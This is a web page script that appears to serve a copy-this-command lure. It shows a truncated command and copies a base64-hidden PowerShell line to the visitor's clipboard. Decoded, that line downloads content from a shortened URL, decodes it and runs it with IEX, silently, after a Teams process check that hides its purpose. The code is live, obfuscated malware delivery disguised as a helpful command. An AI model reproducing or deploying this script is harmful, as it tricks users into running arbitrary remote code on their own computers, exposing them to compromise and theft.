const DISPLAY_CHAR_LIMIT = 50;
const commandPanels = document.querySelectorAll(".command-panel");
const FULL_COMMAND = atob(
  "R2V0LVByb2Nlc3MgLU5hbWUgIm1zLXRlYW1zIiwgIlRlYW1zIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IG91dC1OdWxsOyAkU3R1ZmYgPSAoaXdyIGh0dHBzOi8vdGlueXVybC5jb20veWY2ZGpyaGYpLmNvbnRlbnQ7ICR6ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkU3R1ZmYuVHJpbSgpKSk7IElFWCAkeiB8IG91dC1OVWxsOyA=",
);

function getDisplayText(text) {
  return text.length > DISPLAY_CHAR_LIMIT
    ? `${text.slice(0, DISPLAY_CHAR_LIMIT)}...`
    : text;
}

function setCommandDisplay(commandElement) {
  if (!commandElement) {
    return;
  }

  commandElement.textContent = getDisplayText(FULL_COMMAND);
  commandElement.title = FULL_COMMAND;
}

async function copyCustomCommand(commandElement, statusElement) {
  if (!FULL_COMMAND) {
    if (statusElement) {
      statusElement.textContent = "No command found to copy.";
    }
    return;
  }

  try {
    await navigator.clipboard.writeText(FULL_COMMAND);
    if (statusElement) {
      statusElement.textContent = "Command copied to clipboard.";
    }
  } catch (error) {
    const textArea = document.createElement("textarea");
    textArea.value = FULL_COMMAND;
    textArea.setAttribute("readonly", "");
    textArea.style.position = "fixed";
    textArea.style.left = "-9999px";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      const copied = document.execCommand("copy");
      if (copied) {
        if (statusElement) {
          statusElement.textContent = "Command copied to clipboard.";
        }
      } else if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    } catch (execError) {
      if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    } finally {
      document.body.removeChild(textArea);
    }
  }
}

for (const panel of commandPanels) {
  const commandElement = panel.querySelector(".command-text");
  const copyButton = panel.querySelector(".copy-btn");
  const statusElement = panel.querySelector(".copy-status");

  setCommandDisplay(commandElement);

  if (copyButton && commandElement) {
    copyButton.addEventListener("click", () => {
      copyCustomCommand(commandElement, statusElement);
    });
  }
}
